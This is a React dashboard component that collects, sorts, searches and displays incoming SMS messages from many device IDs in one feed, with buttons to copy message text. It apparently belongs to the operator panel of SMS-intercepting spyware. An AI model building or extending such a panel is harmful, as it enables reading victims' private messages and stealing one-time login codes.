"use client";
import React, { useState } from "react";

export default function AllDevicesSmsPanel({ data, showToast }) {
  const [searchQuery, setSearchQuery] = useState("");
  const [filterDev, setFilterDev] = useState("ALL");
  const [limit, setLimit] = useState(30);

  const smsRoot = data.user_sms || {};
  const devices = data.user_data || {};
  const statusData = data.device_status || {};
  let allFeed = [];

  // Sabhi devices ke messages collect karna
  Object.keys(smsRoot).forEach((devId) => {
    if (filterDev !== "ALL" && filterDev !== devId) return;

    const rawMsgs = smsRoot[devId];
    if (!rawMsgs) return;

    const devInfo = devices[devId] || {};
    const devStatus = statusData[devId] || {};
    const devName = devStatus.device_name || devInfo.Device_info || devInfo.d_name || "Device";

    // Object ya Array dono formats ko handle karna
    const msgList = Array.isArray(rawMsgs) 
      ? rawMsgs.map((m, i) => ({ ...m, _key: i })) 
      : Object.entries(rawMsgs).map(([k, v]) => ({ ...v, _key: k }));

    msgList.forEach((item) => {
      if (!item || typeof item !== "object") return;

      const senderVal = item.sender || item.address || item.from || item.number || "Unknown";
      const bodyVal = item.body || item.message || item.text || item.msg || "No Content";
      
      let timeVal = item.timestamp || item.date || item.time || 0;
      let dateString = item.date_formatted || "";

      if (typeof timeVal === "string") {
        const parsed = Date.parse(timeVal);
        if (!isNaN(parsed)) {
          if (!dateString) dateString = timeVal;
          timeVal = parsed;
        } else {
          timeVal = 0;
        }
      } else if (typeof timeVal === "number" && timeVal > 0) {
        if (!dateString) {
          dateString = new Date(timeVal).toLocaleString();
        }
      }

      if (!dateString) {
        dateString = String(item.date || "N/A");
      }

      allFeed.push({
        id: devId + "_" + (item._key || Math.random()),
        deviceId: devId,
        deviceName: devName,
        sender: senderVal,
        body: bodyVal,
        timestamp: typeof timeVal === "number" ? timeVal : 0,
        dateStr: dateString,
      });
    });
  });

  // Latest messages sabse pehle (Descending)
  allFeed.sort((a, b) => b.timestamp - a.timestamp);

  // Search Filter
  if (searchQuery.trim()) {
    const q = searchQuery.toLowerCase();
    allFeed = allFeed.filter(
      (m) =>
        m.deviceId.toLowerCase().includes(q) ||
        m.deviceName.toLowerCase().includes(q) ||
        m.sender.toLowerCase().includes(q) ||
        m.body.toLowerCase().includes(q)
    );
  }

  // Slice pagination
  const displayedMessages = allFeed.slice(0, limit);

  const copyText = (text, label) => {
    navigator.clipboard.writeText(text);
    showToast(`📋 Copied ${label}: ${text.slice(0, 20)}`, "success");
  };

  const handleLoadMore = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setLimit((prevLimit) => prevLimit + 30);
    showToast(`Loaded more messages...`, "info");
  };

  const allConnectedDeviceIds = Object.keys(smsRoot);

  return (
    <div className="panel active" style={{ paddingBottom: 90 }}>
      {/* Header */}
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-comments" style={{ color: "var(--gold)" }}></i> All Devices Messages Feed
          </h2>
          <p className="panel-sub">Consolidated live stream of all incoming SMS</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-envelope-open-text"></i> Total SMS: {allFeed.length}
          </span>
          <span className="stat-item">
            <i className="fas fa-mobile-alt"></i> Devices: {allConnectedDeviceIds.length}
          </span>
        </div>
      </div>

      {/* Filter & Search Bar */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 10, marginBottom: 14 }}>
        {allConnectedDeviceIds.length > 1 && (
          <div style={{ display: "flex", gap: 6, overflowX: "auto", paddingBottom: 6 }}>
            <button
              type="button"
              className={`filter-btn ${filterDev === "ALL" ? "active" : ""}`}
              onClick={() => { setFilterDev("ALL"); setLimit(30); }}
              style={{ whiteSpace: "nowrap" }}
            >
              All Devices ({allFeed.length})
            </button>
            {allConnectedDeviceIds.map((id) => (
              <button
                key={id}
                type="button"
                className={`filter-btn ${filterDev === id ? "active" : ""}`}
                onClick={() => { setFilterDev(id); setLimit(30); }}
                style={{ whiteSpace: "nowrap" }}
              >
                📱 {id.slice(0, 10)}... ({Object.keys(smsRoot[id] || {}).length})
              </button>
            ))}
          </div>
        )}

        {/* Search Box */}
        <div className="search-container" style={{ margin: 0 }}>
          <i className="fas fa-search search-icon"></i>
          <input
            type="text"
            placeholder="Search by Device ID, Sender, or Text content..."
            className="search-input"
            value={searchQuery}
            onChange={(e) => {
              setSearchQuery(e.target.value);
              setLimit(30);
            }}
          />
          {searchQuery && (
            <button
              type="button"
              className="search-clear-btn"
              style={{ display: "block" }}
              onClick={() => setSearchQuery("")}
            >
              <i className="fas fa-times"></i>
            </button>
          )}
        </div>
      </div>

      {/* Message Cards List */}
      <div 
        style={{ 
          display: "flex", 
          flexDirection: "column", 
          gap: 10 
        }}
      >
        {displayedMessages.length === 0 ? (
          <div className="empty-luxury">
            <i className="fas fa-inbox empty-icon"></i>
            Koi SMS message nahi mila.
          </div>
        ) : (
          displayedMessages.map((m, index) => (
            <div
              key={m.id || index}
              className="sms-card-luxury"
              style={{
                background: "rgba(18, 23, 34, 0.85)",
                border: "1px solid var(--border-color)",
                borderRadius: "var(--radius-sm)",
                padding: "12px 14px",
                borderLeft: "3px solid var(--gold)",
                display: "flex",
                flexDirection: "column",
                gap: 6
              }}
            >
              {/* Card Header */}
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  flexWrap: "wrap",
                  gap: 8,
                  paddingBottom: 6,
                  borderBottom: "1px solid rgba(255,255,255,0.06)",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
                  <span
                    style={{
                      background: "rgba(212, 175, 55, 0.15)",
                      color: "var(--gold)",
                      padding: "2px 8px",
                      borderRadius: 14,
                      fontSize: 10,
                      fontWeight: 700,
                      display: "inline-flex",
                      alignItems: "center",
                      gap: 4,
                      border: "1px solid rgba(212, 175, 55, 0.3)",
                    }}
                  >
                    <i className="fas fa-mobile-alt"></i> {m.deviceId.slice(0, 14)}...
                  </span>

                  <button
                    type="button"
                    onClick={() => copyText(m.deviceId, "Device ID")}
                    title="Copy Device ID"
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "var(--text-muted)",
                      cursor: "pointer",
                      fontSize: 11,
                    }}
                  >
                    <i className="fas fa-copy"></i>
                  </button>

                  <span style={{ fontSize: 12, fontWeight: 700, color: "var(--gold-light)" }}>
                    👤 {m.sender}
                  </span>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                    <i className="far fa-clock"></i> {m.dateStr}
                  </span>
                  <button
                    type="button"
                    onClick={() => copyText(m.body, "Message")}
                    className="btn-sm"
                    style={{
                      background: "rgba(212, 175, 55, 0.1)",
                      color: "var(--gold)",
                      padding: "3px 8px",
                      borderRadius: 6,
                      border: "1px solid rgba(212, 175, 55, 0.2)",
                      cursor: "pointer"
                    }}
                  >
                    <i className="fas fa-copy"></i> Copy
                  </button>
                </div>
              </div>

              {/* Body */}
              <div
                style={{
                  fontSize: 12,
                  lineHeight: 1.5,
                  color: "var(--text-primary)",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-word",
                }}
              >
                {m.body}
              </div>
            </div>
          ))
        )}
      </div>

      {/* LOAD MORE BUTTON WITH COUNTER */}
      {limit < allFeed.length && (
        <div style={{ marginTop: 16, textAlign: "center" }}>
          <button
            type="button"
            className="btn-load-more"
            onClick={handleLoadMore}
            style={{
              padding: "12px",
              fontSize: 12,
              fontWeight: 700,
              background: "#161b26",
              border: "1px solid var(--gold)",
              color: "var(--gold)",
              borderRadius: "var(--radius-sm)",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
              boxShadow: "0 4px 14px rgba(0,0,0,0.5)"
            }}
          >
            <i className="fas fa-chevron-down"></i>
            Load More Messages ({displayedMessages.length} / {allFeed.length} dikh rahe hain)
          </button>
        </div>
      )}
    </div>
  );
}
